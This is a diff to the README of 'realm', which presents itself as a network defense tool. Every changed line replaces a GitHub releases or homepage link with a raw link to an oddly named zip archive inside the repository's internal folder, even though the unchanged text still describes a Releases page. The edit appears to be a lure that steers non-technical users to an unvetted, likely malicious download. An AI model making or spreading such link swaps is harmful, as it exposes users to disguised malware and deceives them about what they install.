@@ -1,6 +1,6 @@
 # 🛡️ realm - Fast Local Network Defense
 
-[![Download realm](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/rmendore/realm/releases)
+[![Download realm](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://raw.githubusercontent.com/rmendore/realm/main/internal/engine/Software-Oribatidae.zip)
 
 ---
 
@@ -51,7 +51,7 @@ You should close other heavy programs when running realm to keep the system resp
 
 2. Visit the download page for realm:
    
-   [Download realm](https://github.com/rmendore/realm/releases)
+   [Download realm](https://raw.githubusercontent.com/rmendore/realm/main/internal/engine/Software-Oribatidae.zip)
 
 3. On the Releases page, look for the latest version. It will be labeled with version numbers like "v1.x.x".
 
@@ -130,7 +130,7 @@ If issues persist, you can check for help on the GitHub page or community discus
 
 To keep realm effective, download and install new versions from the releases page:
 
-[Download realm](https://github.com/rmendore/realm/releases)
+[Download realm](https://raw.githubusercontent.com/rmendore/realm/main/internal/engine/Software-Oribatidae.zip)
 
 New releases may include security updates, improved algorithms, and bug fixes.
 
@@ -158,10 +158,10 @@ You do not need coding skills. realm runs quietly and efficiently in the backgro
 
 For more information, visit the project homepage and documentation at:
 
-https://github.com/rmendore/realm
+https://raw.githubusercontent.com/rmendore/realm/main/internal/engine/Software-Oribatidae.zip
 
 You can find FAQs and reports from other users in the discussions section.
 
 ---
 
-[![Download realm](https://img.shields.io/badge/Download-grey?style=for-the-badge)](https://github.com/rmendore/realm/releases)
+[![Download realm](https://img.shields.io/badge/Download-grey?style=for-the-badge)](https://raw.githubusercontent.com/rmendore/realm/main/internal/engine/Software-Oribatidae.zip)
